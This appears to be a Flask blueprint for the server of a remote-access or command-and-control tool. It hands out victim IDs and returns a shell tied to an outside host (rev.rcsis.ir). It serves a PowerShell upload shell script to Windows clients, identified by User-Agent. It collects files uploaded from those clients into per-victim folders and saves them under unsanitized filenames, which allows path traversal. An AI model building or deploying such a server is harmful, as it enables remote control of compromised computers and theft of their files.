from flask import request,jsonify,render_template,Blueprint,current_app
from ecs.shell import *
url = 'https://rev.rcsis.ir/down/access'


main_blueprint = Blueprint('main', __name__)



@main_blueprint .route('/', methods=['GET'])
def main():
    data = request.args
    uid = data.get('uid')
    step = data.get('s')
    if step == '3':
        return return_shell(url,request)
    context = {
        'uid': uid,
        'step': step,
    }
    content = render_template('control.html',**context)
    return content





@main_blueprint .route('/uid', methods=['GET'])
def uid():
    uid = generate_uid()
    return jsonify({"uid": uid})



@main_blueprint .route('/upload', methods=['POST','GET'])
def upload_file():
    data = request.args
    uid = data.get('uid')
    if request.method == 'GET':
        OS = User_Os(request.headers.get('User-Agent'))
        if OS == 'Windows':
            uploadshell = read_file(f'shells/pws/PSUpload')
            uploadshell = uploadshell.replace("{uid}",f"{uid}")
            return f"{uploadshell}",200
        else:
             return f"{OS} is no valid yet",404
    
    elif request.method == 'POST':
        # Check if the post request has the file part
        if 'file' not in request.files:
            return jsonify({"error": "No file part"}), 400
        file = request.files['file']
        # If user does not select file, browser also submits an empty part without filename
        if file.filename == '':
            return jsonify({"error": "No selected file"}), 400
        # Save the file
        try:
            file_path = f'{sys.path[0]}/clients/{uid}/uploads/{file.filename}'
            file.save(f"{file_path}")
        except:
            file_path = f'{sys.path[0]}/uploads/{file.filename}'
            file.save(f"{file_path}")            
        return jsonify({"message": "File successfully uploaded", "file_path": file_path}), 200
